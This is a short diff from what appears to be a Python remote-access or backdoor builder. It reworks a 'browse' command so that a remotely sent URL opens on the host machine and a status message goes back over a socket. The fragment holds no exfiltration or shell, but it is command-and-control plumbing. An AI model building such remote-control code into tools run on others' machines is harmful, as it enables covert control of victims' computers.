@@ -15,9 +15,9 @@ def browse(site):
     site = site.split(' ',1)[1]
     open_bool = webbrowser.open(site)
     if open_bool:
-        s.sendall(('[+]Opened site : ' + site).encode())
+        main_send('[+]Opened site : ' + site, s)
     else:
-        s.sendall(('[-]Could not open site : ' + site).encode())''')
+        main_send('[-]Could not open site : ' + site, s)''')
         config.logics.append('''
             elif command == "browse":
                 browse(data)''')
